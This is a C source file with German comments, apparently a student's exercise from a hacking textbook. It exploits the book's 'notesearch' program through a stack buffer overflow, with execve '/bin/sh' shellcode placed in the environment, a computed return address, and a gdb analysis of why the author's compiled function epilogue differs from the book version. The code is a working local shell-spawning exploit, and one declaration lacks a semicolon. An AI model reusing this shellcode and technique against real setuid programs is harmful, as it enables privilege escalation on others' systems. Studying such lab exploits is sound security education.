/**
* @file exploit_notesearch_env.c
* @author Philip Wiese
* @date 30 Sep 2016
* @brief Exploitcode f체r Notesearch Programm mit Environement Shellcode Buffer
*
* Shellcode generiert aus @file exec_shell.s 
* #> nasm exec_shell.s
* #> hexdump -v -e '"\\x" 1/1 "%02x" ""' exec_shell; hexdump exec_shell
*
* Aufgrund eines Unterschiedes beim Compilieren des Programmes wird ESP 
* vor dem Aufruf der <Leave> Instuktion ver채ndert und somit EIP beim
* Verlassen der Main-Funktion von einer anderen Addresse geladen.
*
* Weiter Informationen zum Funktion Epolog dieser Version unter
* @file gdb_log-exploit_notesearch_env.txt
* 
* ########################## Unterschied ##########################
* ####### Diese Version	#######			####### Buch-Version #######
*
*	Dump of assembler code 					Dump of assembler cod
*		for function main:						for function main:
*	(...)											(...)
*	call   0x8048510 <close@plt>			call   0x80484c4 <close@plt>	
*	add    esp,0x10							leave
*	mov    eax,0x0								ret
*	lea    esp,[ebp-0x8]						
*	pop    ecx									
*	pop    ebx									
*	pop    ebp								
*	lea    esp,[ecx-0x4]						
*	ret  
*
*	Dump of assembler code for function main:
*		(...)	
*	 	0x08048797 <+211>:	call   0x8048510 <close@plt>
*	   0x0804879c <+216>:	add    esp,0x10
*	   0x0804879f <+219>:	mov    eax,0x0
*	=> 0x080487a4 <+224>:	lea    esp,[ebp-0x8]
*	   0x080487a7 <+227>:	pop    ecx
*	   0x080487a8 <+228>:	pop    ebx
*	   0x080487a9 <+229>:	pop    ebp
*	=> 0x080487aa <+230>:	lea    esp,[ecx-0x4]
*	=> 0x080487ad <+233>:	ret    
*	End of assembler dump.
*
*  1. ESP = EPB-0x8 = 0xbffffd90
*  2. Pop EPB = ret								// Wird vom Buffer 체berschrieben
*  3. Pop ECX = ret								// Wird vom Buffer 체berschrieben
*	4. ESP = ECX-0x4 = ret-0x4	
*  5.	Pop EIP = [ESP] = [ret-0x4]				
*
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "toolbox.h"

#define LENGTH 160

char shellcode[] =
"\xeb\x16\x5b\x31\xc0\x88\x43\x07"
"\x89\x5b\x08\x89\x43\x0c\x8d\x4b"
"\x08\x8d\x53\x0c\xb0\x0b\xcd\x80"
"\xe8\xe5\xff\xff\xff\x2f\x62\x69"
"\x6e\x2f\x73\x68";


int main(int argc, char *argv[]) {
	char *env[2] = { shellcode, 0 };
	unsigned int i, ret
	
	char *buffer = (char *) ec_malloc(LENGTH);
	
	ret = 0xbffffffa - (sizeof(shellcode)-0) - strlen("./notesearch");
 //Original:
 //ret = 0xbffffffa - (sizeof(shellcode)-1) - strlen("./notesearch");
	printf("[DEBUG] Return Address at %p\n", ret);
	for (i=0; i<LENGTH; i+=4) *((unsigned int *)(buffer+i)) = ret;
	
	execle("./notesearch", "notesearch", buffer, 0, env);
	free(buffer);
}
